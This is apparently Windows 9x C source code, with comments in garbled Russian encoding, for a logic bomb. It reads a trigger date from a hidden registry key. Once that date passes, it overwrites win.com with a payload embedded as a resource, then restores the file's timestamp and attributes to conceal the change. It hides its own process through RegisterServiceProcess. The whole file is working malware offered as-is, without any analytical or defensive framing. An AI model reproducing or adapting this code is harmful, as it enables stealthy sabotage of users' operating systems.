/* прога загружаетс€ из VxD, провер€ет дату
   и когда пора, патчит win.com
   дата ставитс€ в реестре
   ключ System\CurrentControlSet\Services\VxD\VXXXD",
   параметр типа BINARY им€ Data, содержит 6 байт (3 WORDа, младший
   байт вперед) - день, мес€ц и год
   на вс€кий случай сохран€ютс€ оригинальные байтики из win.com
   (до перезагрузки еще можно сделать восстановление) в параметре RData
   прога завершаетс€ сразу в любом случае, резидентно не сидит
   патч цепл€етс€ ресурсом к ехешнику
*/

#include <stdio.h>
#include <string.h>
#include <windows.h>


BOOL RegisterServiceProcess( DWORD p1, DWORD p2 )
  {
    typedef DWORD (WINAPI *PREGISTERSERVICEPROCESS)(DWORD,DWORD);

    PREGISTERSERVICEPROCESS  rsp;
    CHAR        K32Path[ MAX_PATH ];
    HINSTANCE   hK32;
    BOOL        Rc;

    Rc = FALSE;
    GetSystemDirectory( K32Path, MAX_PATH );
    strcat( K32Path, "\\kernel32.dll" );
    hK32 = LoadLibrary( K32Path );
    if( hK32 != NULL ) {
      rsp = (PREGISTERSERVICEPROCESS)
                            GetProcAddress( hK32, "RegisterServiceProcess" );
      if( rsp != NULL ) {
        Rc = TRUE;
        rsp( p1, p2 );
      }
      FreeLibrary( hK32 );
    }
    return Rc;
  }

BOOL ReadDateFromRegistry( int* Day, int* Month, int* Year )
  {
    HKEY  KeyH;
    BOOL  Rc;
    DWORD VType, BSz;
    short Buf[3];

    if( RegOpenKeyEx( HKEY_LOCAL_MACHINE,
                      "System\\CurrentControlSet\\Services\\VxD\\VXXXD",
                      0, KEY_READ, &KeyH ) != ERROR_SUCCESS ) return FALSE;
    Rc = FALSE;
    BSz = 6;
    if( RegQueryValueEx( KeyH, "Data", NULL, &VType,
                         (LPBYTE) Buf, &BSz ) == ERROR_SUCCESS )
      if( BSz == 6 ) {
        *Day = Buf[0]; *Month = Buf[1]; *Year = Buf[2];
        Rc = TRUE;
      }
    RegCloseKey( KeyH );
    return Rc;
  }

BOOL SaveRecoverDataInRegistry( char* Data, int DataSz )
  {
    HKEY  KeyH;
    BOOL  Rc;

    if( RegOpenKeyEx( HKEY_LOCAL_MACHINE,
                      "System\\CurrentControlSet\\Services\\VxD\\VXXXD",
                      0, KEY_READ, &KeyH ) != ERROR_SUCCESS ) return FALSE;
    Rc = FALSE;
    if( RegSetValueEx( KeyH, "RData", NULL, REG_BINARY,
                         (LPBYTE) Data, DataSz ) == ERROR_SUCCESS )
      Rc = TRUE;
    RegCloseKey( KeyH );
    return Rc;
  }

int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                      LPSTR lpCmdLine, int nCmdShow )
  {
    SYSTEMTIME  Stm;
    int      Day, Month, Year;
    HRSRC    Rh;
    DWORD    rs, attr, x;
    unsigned char *RPtr;
    HANDLE   Fh;
    FILETIME Ftm;
    static   char  WinCom[MAX_PATH];
    static   char  RData[512];

    RegisterServiceProcess( 0, 1 );  // no need to do this call
    if( ! ReadDateFromRegistry( &Day, &Month, &Year ) ) return 0;
    GetLocalTime( &Stm );
    //sprintf( RData, "wake up date: %d/%d/%d\rNow is %d/%d/%d",
    //         Day, Month, Year, Stm.wDay, Stm.wMonth, Stm.wYear );
    //MessageBox( 0, RData, NULL, 0 );
    if( Stm.wYear < Year || Stm.wMonth < Month || Stm.wDay < Day ) return 0;

    // get pointer and size of the patch
    Rh = FindResource( NULL, MAKEINTRESOURCE( 666 ),
                             MAKEINTRESOURCE( 666 ) );
    if( Rh == NULL ) return 0;
    RPtr = (unsigned char*) LoadResource( NULL, Rh );
    if( RPtr == NULL ) return 0;
    rs = SizeofResource( NULL, Rh );

    // patch win.com
    GetWindowsDirectory( WinCom, MAX_PATH );
    strcat( WinCom, "\\win.com" );
    attr = GetFileAttributes( WinCom );
    SetFileAttributes( WinCom, FILE_ATTRIBUTE_NORMAL );
    Fh = CreateFile( WinCom, GENERIC_READ | GENERIC_WRITE,
                     0, NULL, OPEN_EXISTING, 0, NULL );
    if( Fh != INVALID_HANDLE_VALUE ) {
      GetFileTime( Fh, NULL, NULL, &Ftm );
      ReadFile( Fh, RData, rs, &x, NULL );
      SetFilePointer( Fh, 0, NULL, FILE_BEGIN );
      WriteFile( Fh, RPtr, rs, &x, NULL );
      SetFileTime( Fh, NULL, NULL, &Ftm );
      CloseHandle( Fh );
    }
    SetFileAttributes( WinCom, attr );

    SaveRecoverDataInRegistry( RData, rs );

    hInstance = hPrevInstance = NULL;  // make compiler happy
    lpCmdLine = NULL; nCmdShow = 0;
    return 0;
  }
